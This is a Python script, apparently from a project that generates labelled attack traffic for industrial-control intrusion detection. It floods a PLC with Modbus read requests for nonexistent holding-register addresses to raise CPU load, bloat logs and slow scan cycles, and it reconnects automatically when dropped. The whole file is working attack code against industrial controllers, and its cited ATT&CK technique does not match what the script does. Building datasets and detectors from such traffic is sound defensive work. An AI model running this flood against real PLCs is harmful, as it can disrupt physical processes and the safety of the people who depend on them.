"""
Attack #4: Illegal_Address_Injection (Invalid Address Injection)
==================================================================
Target register: none specific - out-of-range holding register reads
Technique: Sends read requests for holding register addresses that do not
           exist on the PLC.
Effect: Increases CPU load, bloats log files, and lengthens PLC scan time.
MITRE ATT&CK for ICS: T0836 - Modify Parameter
"""
import time, random, sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from pymodbus.client import ModbusTcpClient
from attacks.config import PLC_IP, PLC_PORT, UNIT_ID, LABEL_ILLEGAL_ADDRESS

ATTACK_NAME = "Illegal_Address_Injection"
ATTACK_ID   = LABEL_ILLEGAL_ADDRESS
ILLEGAL_RANGE = (30000, 65535)
ATTACK_DELAY  = 0.01

def run_attack(duration_sec=600, label_manager=None):
    client = ModbusTcpClient(PLC_IP, port=PLC_PORT, timeout=1)
    if not client.connect():
        print(f"[-] PLC connection failed: {PLC_IP}:{PLC_PORT}")
        return False

    print(f"{'='*65}")
    print(f"  ATTACK #{ATTACK_ID}: {ATTACK_NAME}")
    print(f"  Target: {PLC_IP}:{PLC_PORT}")
    print(f"  Address range: HR{ILLEGAL_RANGE[0]}-HR{ILLEGAL_RANGE[1]}")
    print(f"  Duration: {duration_sec}s ({duration_sec//60} min)")
    print(f"{'='*65}")

    if label_manager:
        label_manager.log_attack_start(ATTACK_ID, ATTACK_NAME,
            f"Range=HR{ILLEGAL_RANGE[0]}-HR{ILLEGAL_RANGE[1]}")

    start_time = time.time()
    pkt_count = 0
    err_count = 0

    try:
        while (time.time() - start_time) < duration_sec:
            addr = random.randint(*ILLEGAL_RANGE)
            try:
                result = client.read_holding_registers(address=addr, count=1)
                pkt_count += 1
                if result.isError():
                    err_count += 1
            except Exception:
                try:
                    client.close()
                    client = ModbusTcpClient(PLC_IP, port=PLC_PORT, timeout=1)
                    client.connect()
                except Exception:
                    time.sleep(0.5)

            if pkt_count % 200 == 0 and pkt_count > 0:
                rem = duration_sec - (time.time() - start_time)
                print(f"  [ADDR] {pkt_count} requests | {err_count} errors | remaining: {rem:.0f}s")
            time.sleep(ATTACK_DELAY)

    except KeyboardInterrupt:
        print("\n  [ADDR] Manual stop!")
    finally:
        elapsed = time.time() - start_time
        client.close()
        if label_manager:
            label_manager.log_attack_end(ATTACK_ID, ATTACK_NAME,
                f"{pkt_count} requests, {err_count} errors, {elapsed:.1f}s")
        print(f"\n  [ADDR] {pkt_count} requests, {err_count} errors, {elapsed:.1f}s")
        return True

if __name__ == "__main__":
    run_attack(duration_sec=60)
